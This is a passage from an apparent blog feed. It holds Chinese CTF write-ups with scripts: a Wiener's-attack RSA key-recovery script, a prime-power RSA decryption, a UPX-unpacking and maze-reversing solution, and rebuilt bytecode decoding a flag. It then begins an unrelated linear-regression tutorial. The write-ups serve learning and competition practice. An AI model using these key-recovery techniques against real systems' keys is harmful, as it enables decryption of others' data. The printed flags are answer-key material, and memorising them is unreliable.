class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-keyword">import</span> hashlib<br> <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">transform</span>(<span class="hljs-params">x, y</span>):  <span class="hljs-comment"># 使用辗转相处将分数 x/y 转为连分数的形式</span><br>    res = []<br>    <span class="hljs-keyword">while</span> y:<br>        res.append(x // y)<br>        x, y = y, x % y<br>    <span class="hljs-keyword">return</span> res<br> <br> <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">continued_fraction</span>(<span class="hljs-params">sub_res</span>):<br>    numerator, denominator = <span class="hljs-number">1</span>, <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> sub_res[::-<span class="hljs-number">1</span>]:  <span class="hljs-comment"># 从sublist的后面往前循环</span><br>        denominator, numerator = numerator, i * numerator + denominator<br>    <span class="hljs-keyword">return</span> denominator, numerator  <span class="hljs-comment"># 得到渐进分数的分母和分子，并返回</span><br> <br> <br><span class="hljs-comment"># 求解每个渐进分数</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sub_fraction</span>(<span class="hljs-params">x, y</span>):<br>    res = transform(x, y)<br>    res = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">map</span>(continued_fraction, (res[<span class="hljs-number">0</span>:i] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-built_in">len</span>(res)))))  <span class="hljs-comment"># 将连分数的结果逐一截取以求渐进分数</span><br>    <span class="hljs-keyword">return</span> res<br> <br> <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_pq</span>(<span class="hljs-params">a, b, c</span>):  <span class="hljs-comment"># 由p+q和pq的值通过维达定理来求解p和q</span><br>    par = gmpy2.isqrt(b * b - <span class="hljs-number">4</span> * a * c)  <span class="hljs-comment"># 由上述可得，开根号一定是整数，因为有解</span><br>    x1, x2 = (-b + par) // (<span class="hljs-number">2</span> * a), (-b - par) // (<span class="hljs-number">2</span> * a)<br>    <span class="hljs-keyword">return</span> x1, x2<br> <br> <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">wienerAttack</span>(<span class="hljs-params">e, n</span>):<br>    <span class="hljs-keyword">for</span> (d, k) <span class="hljs-keyword">in</span> sub_fraction(e, n):  <span class="hljs-comment"># 用一个for循环来注意试探e/n的连续函数的渐进分数，直到找到一个满足条件的渐进分数</span><br>        <span class="hljs-keyword">if</span> k == <span class="hljs-number">0</span>:  <span class="hljs-comment"># 可能会出现连分数的第一个为0的情况，排除</span><br>            <span class="hljs-keyword">continue</span><br>        <span class="hljs-keyword">if</span> (e * d - <span class="hljs-number">1</span>) % k != <span class="hljs-number">0</span>:  <span class="hljs-comment"># ed=1 (mod φ(n)) 因此如果找到了d的话，(ed-1)会整除φ(n),也就是存在k使得(e*d-1)//k=φ(n)</span><br>            <span class="hljs-keyword">continue</span><br> <br>        phi = (e * d - <span class="hljs-number">1</span>) // k  <span class="hljs-comment"># 这个结果就是 φ(n)</span><br>        px, qy = get_pq(<span class="hljs-number">1</span>, n - phi + <span class="hljs-number">1</span>, n)<br>        <span class="hljs-keyword">if</span> px * qy == n:<br>            p, q = <span class="hljs-built_in">abs</span>(<span class="hljs-built_in">int</span>(px)), <span class="hljs-built_in">abs</span>(<span class="hljs-built_in">int</span>(qy))  <span class="hljs-comment"># 可能会得到两个负数，负负得正未尝不会出现</span><br>            d = gmpy2.invert(e, (p - <span class="hljs-number">1</span>) * (q - <span class="hljs-number">1</span>))  <span class="hljs-comment"># 求ed=1 (mod  φ(n))的结果，也就是e关于 φ(n)的乘法逆元d</span><br>            <span class="hljs-keyword">return</span> d<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;该方法不适用&quot;</span>)<br> <br> <br>n = <span class="hljs-number">101991809777553253470276751399264740131157682329252673501792154507006158434432009141995367241962525705950046253400188884658262496534706438791515071885860897552736656899566915731297225817250639873643376310103992170646906557242832893914902053581087502512787303322747780420210884852166586717636559058152544979471</span><br>e = <span class="hljs-number">46731919563265721307105180410302518676676135509737992912625092976849075262192092549323082367518264378630543338219025744820916471913696072050291990620486581719410354385121760761374229374847695148230596005409978383369740305816082770283909611956355972181848077519920922059268376958811713365106925235218265173085</span><br>d = wienerAttack(e, n)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;d=&quot;</span>, d)<br>k = <span class="hljs-built_in">hex</span>(d)[<span class="hljs-number">2</span>:]<br>flag = <span class="hljs-string">&quot;NEFUCTF&#123;&quot;</span> + hashlib.md5(k.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)).hexdigest() + <span class="hljs-string">&quot;&#125;&quot;</span><br><span class="hljs-comment"># flag = &quot;NEFUCTF&#123;&quot; + hashlib.md5(hex(d)).hexdigest() + &quot;&#125;&quot;</span><br><span class="hljs-built_in">print</span>(flag)<br><br><span class="hljs-comment"># NEFUCTF&#123;&#123;47bf28da384590448e0b0d23909a25a4&#125;</span><br></code></pre></td></tr></table></figure><h3 id="hard"><a href="#hard" class="headerlink" title="hard"></a>hard</h3><p>RSA加密<br>pow(enc,e,N)</p><p>RSA解密<br>n&#x3D;&#x3D;&gt;p,q<br>phi&#x3D;(p-1)*(q-1)<br>d &#x3D; gmpy2.invert(e,phi)<br>m&#x3D;pow(enc,d,n)</p><p>本题常规解题思路:<br>enc已知  n已知  d?&#x3D;&#x3D;&gt; e已知 ,求phi &#x3D;&#x3D;&gt;求p和q<br>看着加密脚本中多次出现p及p^r，<br>本打算直接开用p&#x3D;gmpy2.iroot(n,r)[0] 开多次方根求p，进而求q &#x2F;&#x2F;根据加密脚本逆运算 未果 开不出来 ╮(╯▽╰)╭</p><p>另一种思路:<br>e太大 可使用算法从e中快速推断出d的值。 可使用Wiener’s Attack进行解d<br>求出d可直接求m<br>但是这样也确实解不出来</p><p>好吧 正确解题思路：<br>n&#x3D;&#x3D;&gt;分解n得到k个p  即n&#x3D;p<strong>k<br>phi&#x3D;(p</strong>k)-(p**k-1)     &#x2F;&#x2F;由欧拉函数得<br>d &#x3D; gmpy2.invert(e,phi)<br>m&#x3D;pow(enc,d,n)</p><p>欧拉函数学习链接:<a href="https://blog.csdn.net/liuzibujian/article/details/81086324">https://blog.csdn.net/liuzibujian/article/details/81086324</a><br>这个数学知识不看还真不行，看这个链接里面的”欧拉函数的几个性质”即可<br>题目中幂使用的是r而不是k<br>(python中使用**代表多少次幂)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python</span><br><span class="hljs-comment">#coding:utf-8</span><br><br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-keyword">import</span> libnum<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes,bytes_to_long<br><br>c = <span class="hljs-string">&quot;...&quot;</span><br><br><br>e = ...<br><br><br>p = ...<br><br>n = p**<span class="hljs-number">4</span><br><br>phi = p**<span class="hljs-number">4</span>-p**<span class="hljs-number">3</span><br><span class="hljs-comment">#c = int(base64.b64decode(c).encode(&#x27;hex&#x27;),16) 延伸</span><br>c = bytes_to_long(c.decode(<span class="hljs-string">&#x27;base64&#x27;</span>))<br>d = gmpy2.invert(e,phi)<br>m = <span class="hljs-built_in">pow</span>(c,d,n)<br><span class="hljs-built_in">print</span> long_to_bytes(m)<br></code></pre></td></tr></table></figure><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="signin-2"><a href="#signin-2" class="headerlink" title="signin"></a>signin</h3><p>将程序拖入IDA后在字符串列表可以找到flag</p><h3 id="signin2"><a href="#signin2" class="headerlink" title="signin2"></a>signin2</h3><p>查壳查到是upx壳<br>手脱或用工具脱壳后用ida打开<br>shift+f12键查看所有字符串可以看到flag</p><h3 id="Maze-misc"><a href="#Maze-misc" class="headerlink" title="Maze(misc)"></a>Maze(misc)</h3><p>在hex-view里看到了迷宫，点开check函数看到</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">bool</span> __cdecl <span class="hljs-title function_">check</span><span class="hljs-params">(<span class="hljs-type">char</span> *flag)</span><br>&#123;<br>  <span class="hljs-type">char</span> *v1; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">int</span> v2; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">char</span> *cur; <span class="hljs-comment">// [esp+Ch] [ebp-4h]170个字符，其中有一个是空字符&#x27;0&#x27;</span><br><br>  cur = &amp;maze[<span class="hljs-number">14</span>];<span class="hljs-comment">//这是一个含14*12的迷宫</span><br>  <span class="hljs-keyword">while</span> ( *flag &amp;&amp; *cur != <span class="hljs-string">&#x27;*&#x27;</span> )<span class="hljs-comment">//由此可见&#x27;*&#x27;是迷宫的墙</span><br>  &#123;<br>    v1 = flag++;<br>    v2 = *v1;<br>    <span class="hljs-keyword">if</span> ( v2 == <span class="hljs-string">&#x27;d&#x27;</span> )<br>    &#123;<br>      ++cur;<span class="hljs-comment">//d为向右走一步</span><br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ( v2 &gt; <span class="hljs-string">&#x27;d&#x27;</span> )<br>    &#123;<br>      <span class="hljs-keyword">if</span> ( v2 == <span class="hljs-string">&#x27;s&#x27;</span> )<br>      &#123;<br>        cur += <span class="hljs-number">13</span>;<span class="hljs-comment">//s为向右13步，在本二维数组中为向左下方一步或向右13步</span><br>      &#125;<br>      <span class="hljs-keyword">else</span><br>      &#123;<br>        <span class="hljs-keyword">if</span> ( v2 != <span class="hljs-string">&#x27;w&#x27;</span> )<br>          <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        cur -= <span class="hljs-number">13</span>;<span class="hljs-comment">//w为向右上方一步或向左13步</span><br>      &#125;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>      <span class="hljs-keyword">if</span> ( v2 != <span class="hljs-string">&#x27;a&#x27;</span> )<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>      --cur;<span class="hljs-comment">//a为向左一步</span><br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">return</span> *cur == <span class="hljs-string">&#x27;#&#x27;</span>;<span class="hljs-comment">//&#x27;#&#x27;是迷宫终点</span><br>&#125;<br><br></code></pre></td></tr></table></figure><p>根据题意，这是个14*12的迷宫，@是起点，#是终点，flag走迷宫的路径，且d:向前一步，a:向后一步，s:向前13步，w:向后13步，写代码生成迷宫</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br><span class="hljs-type">char</span> s[]=<span class="hljs-string">&quot;**************@************-************-***-**-*****--*****-*****-***#**-*****--**----******-*****-******-****--******---**-*******-*-----******-------*****************&quot;</span>;<br><span class="hljs-type">int</span> i,j;<br><span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">12</span>;i++)<br>&#123;<br><span class="hljs-keyword">for</span>(j=<span class="hljs-number">0</span>;j&lt;<span class="hljs-number">14</span>;j++)<br>&#123;<br><span class="hljs-keyword">if</span>(s[i*<span class="hljs-number">14</span>+j]==<span class="hljs-string">&#x27;-&#x27;</span>)<br><span class="hljs-built_in">cout</span>&lt;&lt;<span class="hljs-string">&quot;0&quot;</span>&lt;&lt;<span class="hljs-string">&#x27; &#x27;</span>;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(s[i*<span class="hljs-number">14</span>+j]==<span class="hljs-string">&#x27;*&#x27;</span>)<br><span class="hljs-built_in">cout</span>&lt;&lt;<span class="hljs-string">&quot;X&quot;</span>&lt;&lt;<span class="hljs-string">&#x27; &#x27;</span>;<br><span class="hljs-keyword">else</span> <br><span class="hljs-built_in">cout</span>&lt;&lt;s[i*<span class="hljs-number">14</span>+j]&lt;&lt;<span class="hljs-string">&#x27; &#x27;</span>;<br>&#125;<br><span class="hljs-built_in">cout</span>&lt;&lt;<span class="hljs-built_in">endl</span>;<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125; <br></code></pre></td></tr></table></figure><p>可以写BFS找，也可以直接手动找，得到顺序sssssdsssddsdddwwdwwaaaw，包上nefuctf{}即可提交</p><h3 id="Crypto-1"><a href="#Crypto-1" class="headerlink" title="Crypto"></a>Crypto</h3><p>手逆python字节码。源码用python -m dis code.py生成。</p><p>字节码还原的相关分析参考：</p><p><a href="https://docs.python.org/zh-cn/3/library/dis.html">https://docs.python.org/zh-cn/3/library/dis.html</a></p><p><a href="https://bbs.pediy.com/thread-262577.htm">https://bbs.pediy.com/thread-262577.htm</a></p><p>得到源码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><br>k = <span class="hljs-number">0</span><br>_ = <span class="hljs-number">0</span><br>c = <span class="hljs-string">b&quot;...&quot;</span> <span class="hljs-comment">#base64密文略</span><br><br>c = base64.b64decode(c).decode().split(<span class="hljs-string">&quot;,&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">x</span>(<span class="hljs-params">n</span>):<br>    <span class="hljs-keyword">if</span> n &gt; <span class="hljs-number">1</span>:<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>, n):<br>            <span class="hljs-keyword">if</span> (n % i) == <span class="hljs-number">0</span>:<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>                <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>z = <span class="hljs-keyword">lambda</span> n: (<span class="hljs-number">2</span> ** n) - <span class="hljs-number">1</span><br><br>out = <span class="hljs-string">&#x27;&#x27;</span><br><br><span class="hljs-keyword">while</span> _ &lt; <span class="hljs-built_in">len</span>(c):<br>    <span class="hljs-keyword">if</span> x(z(k)):<br>        out += <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(c[_]) ^ z(k))<br>        _ += <span class="hljs-number">1</span><br>    k += <span class="hljs-number">1</span><br><br><span class="hljs-built_in">print</span>(out.join([<span class="hljs-string">&#x27;flag&#123;&#x27;</span>,<span class="hljs-string">&#x27;&#125;&#x27;</span>]))<br></code></pre></td></tr></table></figure><p>c解出的list与满足函数x()条件的 $2^k-1$ 分别异或得到结果，而x()中判断 $2^k-1$ 是否为素数。<br>直接运行在短时间只能得到前几位的结果，是因为 $2^k-1$ 的值为指数级增长，而且x()中又需对每个数从2至当前数遍历，非常耗时。<br>换个角度，c的list长度为47，那么只需寻找前47个满足 $2^k-1$ 为素数的 k 值即可。<br>这里可以自行学习一下梅森素数<br>可见满足梅森素数（$2^k-1$）的梅森指数（k 值）必定也是素数，而寻找梅森素数的过程很复杂且极其耗时（发现第35-51个梅森素数的过程，使用巨型分布式算力都花费了近20年）。<br>对于著名数列，可以使用在线整数数列查询网站（OEIS）查询，梅森素数数列里不足47个，不过可以从梅森指数数列里取47个 k 再计算 $2^k-1$。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><br>_ = <span class="hljs-number">0</span><br>c = <span class="hljs-string">b&quot;...&quot;</span> <span class="hljs-comment">#base64密文略</span><br><br>c = base64.b64decode(c).decode().split(<span class="hljs-string">&quot;,&quot;</span>)<br><br>me = [<span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">5</span>, <span class="hljs-number">7</span>, <span class="hljs-number">13</span>, <span class="hljs-number">17</span>, <span class="hljs-number">19</span>, <span class="hljs-number">31</span>, <span class="hljs-number">61</span>, <span class="hljs-number">89</span>, <span class="hljs-number">107</span>, <span class="hljs-number">127</span>, <span class="hljs-number">521</span>, <span class="hljs-number">607</span>, <span class="hljs-number">1279</span>, <span class="hljs-number">2203</span>, <span class="hljs-number">2281</span>, <span class="hljs-number">3217</span>, <span class="hljs-number">4253</span>, <span class="hljs-number">4423</span>, <span class="hljs-number">9689</span>, <span class="hljs-number">9941</span>, <span class="hljs-number">11213</span>, <span class="hljs-number">19937</span>, <span class="hljs-number">21701</span>, <span class="hljs-number">23209</span>, <span class="hljs-number">44497</span>, <span class="hljs-number">86243</span>, <span class="hljs-number">110503</span>, <span class="hljs-number">132049</span>, <span class="hljs-number">216091</span>, <span class="hljs-number">756839</span>, <span class="hljs-number">859433</span>, <span class="hljs-number">1257787</span>, <span class="hljs-number">1398269</span>, <span class="hljs-number">2976221</span>, <span class="hljs-number">3021377</span>, <span class="hljs-number">6972593</span>, <span class="hljs-number">13466917</span>, <span class="hljs-number">20996011</span>, <span class="hljs-number">24036583</span>, <span class="hljs-number">25964951</span>, <span class="hljs-number">30402457</span>, <span class="hljs-number">32582657</span>, <span class="hljs-number">37156667</span>, <span class="hljs-number">42643801</span>, <span class="hljs-number">43112609</span>]<br><br>out = <span class="hljs-string">&#x27;&#x27;</span><br><br><span class="hljs-keyword">while</span> _ &lt; <span class="hljs-built_in">len</span>(c):<br>out += <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(c[_]) ^ <span class="hljs-number">2</span>**me[_]-<span class="hljs-number">1</span>)<br>_ += <span class="hljs-number">1</span><br><br><span class="hljs-built_in">print</span>(out.join([<span class="hljs-string">&#x27;flag&#123;&#x27;</span>,<span class="hljs-string">&#x27;&#125;&#x27;</span>]))<br></code></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> NEFU </tag>
            
            <tag> CTF </tag>
            
            <tag> WP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ML-程序练习-Dragon</title>
      <link href="/2021/10/f7d4c741.html"/>
      <url>/2021/10/f7d4c741.html</url>
      
        <content type="html"><![CDATA[<h1 id="回归问题"><a href="#回归问题" class="headerlink" title="回归问题"></a>回归问题</h1><h2 id="前期"><a href="#前期" class="headerlink" title="前期"></a>前期</h2><p>假设已有某样例，参数为w&#x3D;1.477, b&#x3D;0.089，即为$y&#x3D;1.477x+0.089$</p><h2 id="过程分析"><a href="#过程分析" class="headerlink" title="过程分析"></a>过程分析</h2><h3 id="数据采样"><a href="#数据采样" class="headerlink" title="数据采样"></a>数据采样</h3><p>首先我们需要模拟一些带有真实样本观测误差的数据（因为真实情况是真实模型我们已经知道了），所以我们在这里给模型添加误差自变量$\epsilon$，其采样自均值为0，标准差为0.01的高斯分布：<br>$$<br>y&#x3D;1.477x+0.089+\epsilon,\epsilon\sim N(0, {0.01}^2)<br>$$<br>通过随机采样100次获得训练数据集</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">data = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">100</span>):<br>    x=np.random.uniform(-<span class="hljs-number">10.</span>, <span class="hljs-number">10.</span>)<br>    eps=np.random.normal(<span class="hljs-number">0.</span>, <span class="hljs-number">0.01</span>)<br>    y=<span class="hljs-number">1.477</span>*x+<span class="hljs-number">0.089</span>+eps<br>    data.append([x,y])<br>data=np.array(data)<br></code></pre></td></tr></table></figure><h3 id="MSE"><a href="#MSE" class="headerlink" title="MSE"></a>MSE</h3><p>计算每个点的预测值与真实值之间差的平方并累加，获得均方误差损失值</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">mse</span>(<span class="hljs-params">b, w, points</span>): <span class="hljs-comment"># 误差计算</span><br>    totalError=<span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(points)):<span class="hljs-comment">#循环迭代</span><br>        x=points[i, <span class="hljs-number">0</span>]<br>        y=points[i, <span class="hljs-number">1</span>]<br>        totalError+=(y-(w*x+b))**<span class="hljs-number">2</span><br>    <span class="hljs-keyword">return</span> totalError/<span class="hljs-built_in">float</span>(<span class="hljs-built_in">len</span>(points))<span class="hljs-comment"># 求均方差</span><br></code></pre></td></tr></table></figure><p>最后的误差和除以样本总数得到平均误差</p><h3 id="梯度计算"><a href="#梯度计算" class="headerlink" title="梯度计算"></a>梯度计算</h3><p>这里首先需要推导一下梯度的表达式<br>$$<br>\frac{\alpha L}{\alpha w}&#x3D;\frac{\alpha \frac{1}{n}\sum_{i&#x3D;1}^{n}{(wx^{(i)}+b-y^{(i)})}^2}{\alpha w}&#x3D;\frac{1}{n}\sum_{i&#x3D;1}^{n}\frac{\alpha{(wx^{(i)}+b-y{(i)})}^2}{\alpha w}<br>$$<br>所以可以得到<br>$$<br>\frac{\alpha L}{\alpha w}&#x3D;\frac{2}{n}\sum_{i&#x3D;1}^n(wx^{(i)}+b-y^{(i)}·x^{(i)})<br>$$<br>同理，可以推导得到<br>$$<br>\frac{\alpha L}{\alpha b}&#x3D;\frac{1}{n}\sum_{i&#x3D;1}^n2(wx^{(i)}+b-y^{(i)})·1<br>$$<br>所以，我们只需要计算出上述两个值，平均以后即可得到偏导数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">stepdown_gradient</span>(<span class="hljs-params">b_current, w_current, points, lr</span>):<br>    b_gradient=<span class="hljs-number">0</span><br>    w_gradient=<span class="hljs-number">0</span><br>    M=<span class="hljs-built_in">float</span>(<span class="hljs-built_in">len</span>(points))<span class="hljs-comment">#样本总数</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(points)):<br>        x=points[i, <span class="hljs-number">0</span>]<br>        y=points[i, <span class="hljs-number">1</span>]<br>        b_gradient+=(<span class="hljs-number">2</span>/M)*((w_current * x + b_current) - y)<br>        w_gradient+=(<span class="hljs-number">2</span>/M)*x*((w_current*x + b_current)-y)<br>    new_b=b_current-(lr*b_gradient)<br>    new_w=w_current-(lr*w_gradient)<br>    <span class="hljs-keyword">return</span> [new_b,new_w]<br></code></pre></td></tr></table></figure><h3 id="梯度更新"><a href="#梯度更新" class="headerlink" title="梯度更新"></a>梯度更新</h3><p>我们可以根据计算出的误差函数在w和b处的梯度后，根据$x^&#96;&#x3D;x-\eta\triangledown f$更新w和b的值。对数据集的所有样本训练一次称为一个Epoch，共循环迭代num_iterations个Epoch</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">gradient_descent</span>(<span class="hljs-params">points, starting_b, starting_w, lr, num_iterations</span>):<br>    b=starting_b<br>    w=starting_w<br><br>    <span class="hljs-keyword">for</span> step <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(num_iterations):<br>        b, w=stepdown_gradient(b, w, np.array(points), lr)<br>        loss=mse(b, w, points)<br>        <span class="hljs-keyword">if</span> step%<span class="hljs-number">50</span>==<span class="hljs-number">0</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;iteration:<span class="hljs-subst">&#123;step&#125;</span>, loss:<span class="hljs-subst">&#123;loss&#125;</span>, w:<span class="hljs-subst">&#123;w&#125;</span>, b:<span class="hljs-subst">&#123;b&#125;</span>&quot;</span>)<br>    <span class="hljs-keyword">return</span> [b, w]<br></code></pre></td></tr></table></figure><h2 id="完整程序"><a href="#完整程序" class="headerlink" title="完整程序"></a>完整程序</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span 